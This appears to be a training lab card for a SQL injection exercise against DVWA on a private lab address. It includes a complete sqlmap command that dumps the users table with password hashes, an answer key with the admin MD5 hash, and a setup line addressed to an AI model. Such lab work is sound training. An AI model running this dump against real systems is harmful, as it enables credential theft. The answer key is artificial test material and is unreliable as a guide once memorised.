# Q254 — Dump Table Contents

| Field | Value |
|-------|-------|
| **Target** | `192.168.52.129` |
| **Domain** | Web Apps / SQL Injection |
| **Difficulty** | 🟡 Medium |
| **Tools** | `sqlmap` |
| **Time budget** | 8–12 min |

---

## 📝 Question

"Dump the `users` table from the `dvwa` database. Report all usernames and their password hashes."

---

## 🎯 Flag Format

```
admin_hash=<md5_hash>; total_users=<number>
```

---

## ✅ Solution

```bash
sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<session>;security=low" -D dvwa -T users --dump --batch
```

**Answer:** `admin_hash=5f4dcc3b5aa765d61d8327deb882cf99; total_users=5`

---

## 🤖 Claude Setup Prompt

Same as Q251. Report back: "Lab ready for Q254"
